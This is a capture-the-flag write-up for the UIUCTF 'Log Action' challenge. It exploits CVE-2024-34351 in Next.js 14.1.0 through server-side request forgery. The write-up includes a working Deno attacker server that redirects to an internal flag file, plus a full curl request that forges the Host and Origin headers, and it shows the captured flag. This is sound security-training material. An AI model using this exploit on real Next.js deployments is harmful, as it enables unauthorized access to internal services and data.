# Log Action

I keep trying to log in, but it's not working :'(

## Writeup

The version of **NextJS** is **14.1.0**.

This version is vulnerable to [CVE-2024-34351](https://github.com/azu/nextjs-CVE-2024-34351.git).

So we can create a **TypeScript** server that **redirect** to **http://backend/flag.txt**:

```ts
// Attacker server to test SSRF vulnerability in the target server
// https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
Deno.serve((request: Request) => {
    console.log("Request received: " + JSON.stringify({
        url: request.url,
        method: request.method,
        headers: Array.from(request.headers.entries()),
    }));
    // Head - 'Content-Type', 'text/x-component');
    if (request.method === 'HEAD') {
        return new Response(null, {
            headers: {
                'Content-Type': 'text/x-component',
            },
        });
    }
    // Get - redirect to http://backend/flag.txt
    if (request.method === 'GET') {
        return new Response(null, {
            status: 302,
            headers: {
                Location: 'http://backend/flag.txt',
            },
        });
    }
});
```

We can upload this script to **https://dash.deno.com/login?redirect=/** and it will give us a link:

```
https://posh-duck-89.deno.dev/
```

So now we can intercept the **logout** request and change **Host** and **Origin** field with this link:

```bash
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: posh-duck-89.deno.dev' -H $'Content-Length: 279' -H $'Accept: text/x-component' -H $'Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22logout%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D' -H $'Next-Action: c3a144622dd5b5046f1ccb6007fea3f3710057de' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIlk0KUJ6uRCIvjZ1' -H $'Origin: http://posh-duck-89.deno.dev' -H $'Referer: http://log-action.challenge.uiuc.tf/logout' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'authjs.csrf-token=a916a8ffda4f457233cbcc7ec1c78c477e9562e12ef1eb8e59657c5e130bbb02%7C44c199d2d15e17c86b52815c2b287f014a6fa7bf0eef27ed32e13e81d8a72c9e; authjs.callback-url=http%3A%2F%2Flog-action.challenge.uiuc.tf%2Flogout' \
    --data-binary $'------WebKitFormBoundaryIlk0KUJ6uRCIvjZ1\x0d\x0aContent-Disposition: form-data; name=\"1_$ACTION_ID_c3a144622dd5b5046f1ccb6007fea3f3710057de\"\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryIlk0KUJ6uRCIvjZ1\x0d\x0aContent-Disposition: form-data; name=\"0\"\x0d\x0a\x0d\x0a[\"$K1\"]\x0d\x0a------WebKitFormBoundaryIlk0KUJ6uRCIvjZ1--\x0d\x0a' \
    $'http://log-action.challenge.uiuc.tf/logout'
```

With this response:

```
uiuctf{close_enough_nextjs_server_actions_welcome_back_php}
```